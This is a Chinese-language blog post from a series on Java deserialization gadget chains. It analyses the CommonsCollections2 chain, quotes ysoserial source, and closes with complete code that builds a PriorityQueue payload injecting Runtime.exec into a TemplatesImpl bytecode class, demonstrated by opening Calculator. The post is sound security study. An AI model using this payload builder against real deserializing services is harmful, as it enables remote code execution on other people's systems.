---
title: "Java反序列化利用链学习 - CommonCollection2"
date: 2022-05-01T14:21:00+08:00
lastmod: 2022-05-01T14:22:00+08:00
draft: false
lightgallery: true
categories: [
    "Java Security",
]
tags: [
    "deserialiaztion",
    "java",
    "common collection",
]
---
## Java反序列化利用链系列

* [Java反序列化利用链 - CommonCollection1](commoncollection1.md)
* [Java反序列化利用链 - CommonCollection2](commoncollection2.md)
* [Java反序列化利用链 - CommonCollection3](commoncollection3.md)
* [Java反序列化利用链 - CommonCollection4](commoncollection4.md)
* [Java反序列化利用链 - CommonCollection5](commoncollection5.md)
* [Java反序列化利用链 - CommonCollection6](commoncollection6.md)
* [Java反序列化利用链 - CommonCollection7](commoncollection7.md)

## Java反序列化利用链 - CommonCollection2

### 前置条件

* JDK 1.7
* commons-collections4 4.0

### 利用链分析

`CommonCollection2`利用链的调用过程大致如下：

```
Gadget chain:
    ObjectInputStream.readObject()
        PriorityQueue.readObject()
            ...
            PriorityQueue.siftDownUsingComparator()
                TransformingComparator.compare()
                    InvokerTransformer.transform()
                        Method.invoke()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.defineTransletClasses()
                                    Runtime.exec()
```

先看`PriorityQueue#readObject`

```java
private void readObject(java.io.ObjectInputStream s)
    throws java.io.IOException, ClassNotFoundException {
    // Read in size, and any hidden stuff
    s.defaultReadObject();

    // Read in (and discard) array length
    s.readInt();

    SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size);
    queue = new Object[size];

    // Read in all elements.
    for (int i = 0; i < size; i++)
        queue[i] = s.readObject();

    // Elements are guaranteed to be in "proper order", but the
    // spec has never explained what that might be.
    heapify();
}
```

这里重点需要关注的是对`heapify()`对调用，它的目的是对优先队列中维护的成员（`queue`）根据默认的优先级进行排列，

```java
private void heapify() {
    for (int i = (size >>> 1) - 1; i >= 0; i--)
        siftDown(i, (E) queue[i]);
}
```

这里要求`size > 1`，所以构造利用链时，`PriorityQueue`的容量为`2`。而`siftDown`会根据是否指定了一个`compator`，来决定如何比较，这是利用链的关键。
构造时指定来`TransformingComparator`，所以`siftDown`后续会进入`siftDownUsingComparator`，

```java
private void siftDownUsingComparator(int k, E x) {
    int half = size >>> 1;
    while (k < half) {
        int child = (k << 1) + 1;
        Object c = queue[child];
        int right = child + 1;
        if (right < size &&
            comparator.compare((E) c, (E) queue[right]) > 0)
            c = queue[child = right];
        if (comparator.compare(x, (E) c) <= 0)
            break;
        queue[k] = c;
        k = child;
    }
    queue[k] = x;
}
```

而这里会导致调用`TransformingComparator#compare`函数，利用链中构造`TransformingComparator`的`transformer`为`InvokerTransformer`，指定的调用方法是`TemplatesImpl#newTransformer`。根据`ysoserial`的代码来看`TemplatesImpl`类有两种，`org.apache.xalan.xsltc.trax.TemplatesImpl`或`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`。

而决定使用哪一个，由`System.getProperty("properXalan", "false")`决定，`properXalan`属性的含义暂没搜到，目前只要清楚它的作用即可。

### TemplatesImpl

从`newTransformer`开始，后面就是`TemplatesImp`利用链的内容了，`ysoserial`中的相关代码如下

```java
public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
    final T templates = tplClass.newInstance();

    // use template gadget class
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
    pool.insertClassPath(new ClassClassPath(abstTranslet));
    final CtClass clazz = pool.get(StubTransletPayload.class.getName());
    // run command in static initializer
    // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
    String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
        command.replace("\\", "\\\\").replace("\"", "\\\"") +
        "\");";
    clazz.makeClassInitializer().insertAfter(cmd);
    // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
    clazz.setName("ysoserial.Pwner" + System.nanoTime());
    CtClass superC = pool.get(abstTranslet.getName());
    clazz.setSuperclass(superC);

    final byte[] classBytes = clazz.toBytecode();

    // inject class bytes into instance
    Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
        classBytes, ClassFiles.classAsBytes(Foo.class)
    });

    // required to make TemplatesImpl happy
    Reflections.setFieldValue(templates, "_name", "Pwnr");
    Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
    return templates;
}
```

在构造时，后3个参数有两种可能情况，这里分析时以下面对为例

```
TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class
```

这个函数主要通过`javassist`工具，构造了一个自定义的类，并且在里面初始化了一个静态代码块用于执行`cmd`中的内容，最后将它放入`_bytecodes`中。
~需要注意的是，这个自定义的类，它的父类为`AbstractTranslet`，原因后面会看到。~

前面说到利用链一路调用至`newTransformer`函数，它的代码如下

```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```

从构造利用链的代码来看，利用与`_bytecodes`成员有关，由此可以一路跟踪到`getTransletInstance->defineTransletClasses`函数

注意`getTransletInstance`函数中有如下判断

```java
if (_name == null) return null;
if (_class == null) defineTransletClasses();
```

所以构造时`_name`和`_class`不可为`null`。下面看`defineTransletClasses`

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

到了这里会判断`_bytecodes`是否为`null`，并创建一个类加载器在后续获取`_bytecodes`数组中的内容后调用`defineClass`，从而执行静态代码块的内容，达成命令执行的目的。

这里从代码逻辑的角度看`_bytecodes`的大小没有特意设定为`2`的必要，但`ysoserial`却好像多放了一个多余的`Foo.class`。

完整构造`PriorityQueue`的代码如下

```java
public static class StubTransletPayload extends AbstractTranslet implements Serializable {
    private static final long serialVersionUID = -5971610431559700674L;

    @Override
    public void transform (DOM document, SerializationHandler[] handlers ) throws TransletException {}

    @Override
    public void transform (DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
}

Class templateClazz = null;
Class absTransletClazz = null;
Class tsfFacImplClazz = null;
if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
    templateClazz = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
    absTransletClazz = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
    tsfFacImplClazz = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
} else {
    templateClazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
    absTransletClazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
    tsfFacImplClazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl");
}

ClassPool pool = ClassPool.getDefault();
pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
pool.insertClassPath(new ClassClassPath(absTransletClazz));

CtClass clazz = pool.get(StubTransletPayload.class.getName());
String cmd = "java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");";

clazz.makeClassInitializer().insertAfter(cmd);
clazz.setName("ysoserial.Pwner" + System.nanoTime());
CtClass superC = pool.get(absTransletClazz.getName());
clazz.setSuperclass(superC);

Object template = templateClazz.newInstance();
final byte[] classBytes = clazz.toBytecode();

Reflections.setFieldValue(template, "_bytecodes", new byte[][] {classBytes});
Reflections.setFieldValue(template, "_name", "trganda");
Reflections.setFieldValue(template, "_tfactory", tsfFacImplClazz.newInstance());

InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);

PriorityQueue queue = new PriorityQueue(2, new TransformingComparator(transformer));

Reflections.setFieldValue(queue, "queue", new Object[] {template, 1});
Reflections.setFieldValue(queue, "size", 2);
```

## References

1. <https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections2.java>
